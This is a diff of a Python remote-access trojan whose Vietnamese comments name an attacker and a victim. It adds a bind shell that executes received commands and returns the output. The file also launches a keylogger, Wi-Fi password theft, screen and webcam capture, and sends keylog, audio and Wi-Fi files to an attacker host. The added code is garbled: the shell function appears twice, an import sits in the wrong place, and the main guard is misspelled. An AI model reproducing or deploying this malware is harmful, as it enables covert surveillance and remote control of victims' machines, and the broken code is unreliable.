@@ -131,102 +131,107 @@ def screen_sender(host='0.0.0.0', port=5001):
             threadscreen2.start()
 
 
-def handle_client(client_socket):
-    BUFFER_SIZE = 4096
-    while True:
-        try:
-      
-            command = client_socket.recv(BUFFER_SIZE).decode('utf-8')  
-            if command.lower() == "exit":
-                print("Disconnected from client.")
-                break
-           
-            output = subprocess.getoutput(command)
-            if not output:
-                output = "Command executed but no output."
-            
-            # Gửi kết quả trả về attacker
-            client_socket.send(output.encode('utf-8'))
-        except Exception as e:
-            print(f"Error: {e}")
-            break
-    
-    client_socket.close()
+import subprocess
 
 def R_tcp(host='0.0.0.0', port=5000):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(5)
-    print(f"Reverse shell started and listening on {host}:{port}.")
+    s = socket.socket()
+    BUFFER_SIZE = 4096
 
-    while True:
-        client_socket, client_address = s.accept()
-        print(f"{client_address[0]}:{client_address[1]} Connected!")
-        
-        
-        threading.Thread(target=handle_client, args=(client_socket,)).start()
-
-def capturevid(conn):
-    cap = cv2.VideoCapture(0)
-    while (cap.isOpened()):
-        _, frame = cap.read()
-        compress_img = cv2.imencode('.jpg', frame)[1]
-        dat = compress_img.tostring()
-        size = len(dat)
-        count = math.ceil(size / (MAX_IMAGE_DGRAM))
-        array_pos_start = 0
-        while count:
-            array_pos_end = min(size, array_pos_start + MAX_IMAGE_DGRAM)
-            conn.send(struct.pack("B", count) + dat[array_pos_start:array_pos_end])
-            array_pos_start = array_pos_end
-            count -= 1
-    cap.release()
-    cv2.destroyAllWindows()
-    conn.close()
-
-
-def camsender(port=5002):
-    host = "0.0.0.0"
-    with socket.socket() as sock:
-        sock.bind((host, port))
-        sock.listen(5)
-        print('camera sender started.')
-
-        while 'connected':
-            conn, addr = sock.accept()
-            print('Client connected IP:', addr)
-            thread = threading.Thread(target=capturevid, args=(conn,))
-            thread.start()
-
-
-
-def send_file(conn, file_path):
     try:
-        # Extract file name and size
-        filename = os.path.basename(file_path)
-        filesize = os.path.getsize(file_path)
+        s.bind((host, port))
+        s.listen(7)
+        print(f"Revershell đã bắt đầu. Đang lắng nghe tại {host}:{port}.")
 
-        # Send file info (file name and size) as a structured string
-        file_info = f"{filename}|{filesize}".encode('utf-8')
-        conn.sendall(file_info.ljust(1024))  # Ensure it's 1024 bytes for receiving consistency
+        client_socket, client_address = s.accept()
+        print(f"{client_address[0]}:{client_address[1]} !")
 
-        # Send the file data in chunks
-        with open(file_path, 'rb') as f:
-            while True:
-                bytes_read = f.read(4096)
-                if not bytes_read:
+        while True:
+            try:
+                # Nhận lệnh từ kẻ tấn công
+                lệnh = client_socket.recv(BUFFER_SIZE).decode()
+                print(f"Nhận lệnh từ kẻ tấn công: {lệnh}")  # In ra lệnh nhận được
+
+                if lệnh.lower() == "exit":  # Kiểm tra nếu nhận được lệnh thoát
+                    print("Người tấn công đã yêu cầu thoát. Đóng kết nối...")
                     break
-                conn.sendall(bytes_read)
 
-        print(f"[VICTIM]: File {filename} sent successfully!")
+                # Thực hiện lệnh
+                print(f"Đang thực hiện lệnh: {lệnh}")
+                output = subprocess.getoutput(lệnh)
+
+                # Gửi lại kết quả cho kẻ tấn công
+                if output:  # Nếu có kết quả
+                    client_socket.send(output.encode('utf-8'))
+                else:  # Nếu không có kết quả
+                    client_socket.send("Không có kết quả trả về.".encode('utf-8'))  # Gửi thông báo khi không có kết quả
+
+            except Exception as e:
+                error_message = f"Lỗi trong quá trình thực hiện lệnh: {e}"
+                print(error_message)  # In ra thông báo lỗi
+                client_socket.send(error_message.encode('utf-8'))  # Gửi thông báo lỗi cho kẻ tấn công
+                break
 
     except Exception as e:
-        print(f"Error sending file: {e}")
+        print(f"Lỗi khi thiết lập kết nối: {e}")
+    finally:
+        client_socket.close()
+        s.close()
+        print("Kết nối đã được đóng.")
+
+import socket
+import subprocess
+
+def R_tcp(máy_chủ='0.0.0.0', cổng=5000):
+    s = socket.socket()
+    BUFFER_SIZE = 4096
+
+    try:
+        s.bind((máy_chủ, cổng))
+        s.listen(7)
+        print(f"Revershell đã bắt đầu. Đang lắng nghe tại {máy_chủ}:{cổng}.")
+
+        client_socket, client_address = s.accept()
+        print(f"{client_address[0]}:{client_address[1]} đã kết nối!")
+
+        while True:
+            try:
+                # Nhận lệnh từ kẻ tấn công
+                lệnh = client_socket.recv(BUFFER_SIZE).decode()
+                print(f"Nhận lệnh từ kẻ tấn công: {lệnh}")  # In ra lệnh nhận được
+
+                if lệnh.lower() == "exit":  # Kiểm tra nếu nhận được lệnh thoát
+                    print("Người tấn công đã yêu cầu thoát. Đóng kết nối...")
+                    break
+
+                # Thực hiện lệnh
+                print(f"Đang thực hiện lệnh: {lệnh}")
+                output = subprocess.getoutput(lệnh)
+
+                # Gửi lại kết quả cho kẻ tấn công
+                if output:  # Nếu có kết quả
+                    client_socket.send(output.encode('utf-8'))
+                else:  # Nếu không có kết quả
+                    client_socket.send("Không có kết quả trả về.".encode('utf-8'))  # Gửi thông báo khi không có kết quả
+
+            except Exception as e:
+                error_message = f"Lỗi trong quá trình thực hiện lệnh: {e}"
+                print(error_message)  # In ra thông báo lỗi
+                client_socket.send(error_message.encode('utf-8'))  # Gửi thông báo lỗi cho kẻ tấn công
+                break
+
+    except Exception as e:
+        print(f"Lỗi khi thiết lập kết nối: {e}")
+    finally:
+        client_socket.close()
+        s.close()
+        print("Kết nối đã được đóng.")
+
+# Gọi hàm lắng nghe
+R_tcp()
 
 
 
-
-if __name__ == "__main__":
+if _name_ == "_main_":
     # parse args for socket connection
     options = parseargs()
     # keylogger
@@ -249,7 +254,7 @@ if __name__ == "__main__":
         wifipass()
     # Reverse shell tcp
     if (options.shell == "t"):
-        threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port))  # port 5000
+        threadshell = threading.Thread(target=R_tcp, args=(options.host,5000))  # port 5000
         threadshell.start()
     # screen sender udp
     import zlib, mss
@@ -269,7 +274,7 @@ if __name__ == "__main__":
         threadcam.start()
     
     # Send files to attacker
-    attacker_host = '192.168.1.67'  # Assuming the attacker's IP is the same as the listening IP
+    attacker_host = '127.0.0.1'  # Assuming the attacker's IP is the same as the listening IP
     file_transfer_port = options.port + 3  # Using a new port for file transfer
     
     files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
